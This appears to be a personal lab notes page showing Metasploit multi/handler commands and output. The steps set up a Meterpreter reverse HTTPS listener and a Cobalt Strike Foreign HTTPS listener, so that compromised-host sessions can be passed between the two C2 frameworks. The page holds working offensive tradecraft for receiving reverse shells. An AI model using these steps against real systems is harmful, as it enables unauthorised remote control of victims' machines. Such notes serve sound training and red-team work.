setup msfconsole `multi/handler`
```bash
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 
```
setup payload
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > 
```
show options 
-> `set lhost`
-> `set lport`
```bash
msf6 exploit(multi/handler) > set lhost 10.10.14.39
lhost => 10.10.14.39
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_https):

Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.39      yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path



Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > 
```
`set ExitOnSession  false` 
- allows multiple sessions to exist in meterpreter without killing session
```bash
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
```
`exploit -j`
- sets background meterpreter job, multi/handler is listening
```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://10.10.14.39:443
```
Create new Cobalt Strike Listener to pass session to meterpreter session
```bash
Listener -> New Listener -> Options below -> Save
NAME: msf - meterpreter https_session
PAYLOAD: Foreign HTTPS
HTTPS Host(Stager): 10.10.14.39
HTTPS Port(Stager): 443
```

![[ss-20250911-cobaltstrike-to-meterpreter-session-passing.png]]